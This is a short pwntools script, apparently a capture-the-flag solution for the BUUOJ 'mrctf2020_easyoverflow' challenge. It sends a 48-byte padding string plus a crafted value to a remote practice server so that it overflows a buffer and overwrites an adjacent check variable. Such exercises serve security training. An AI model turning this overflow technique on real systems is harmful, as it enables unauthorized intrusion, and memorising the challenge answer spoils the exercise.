from pwn import *

file_name = '/mnt/hgfs/CyberSecurity/PWN/buuoj/mrctf2020_easyoverflow'
# target = process([file_name])
target = remote('node4.buuoj.cn', 25926)

payload = b'123456789012345678901234567890123456789012345678n0t_r3@11y_f1@g'

target.sendline(payload)
target.interactive()
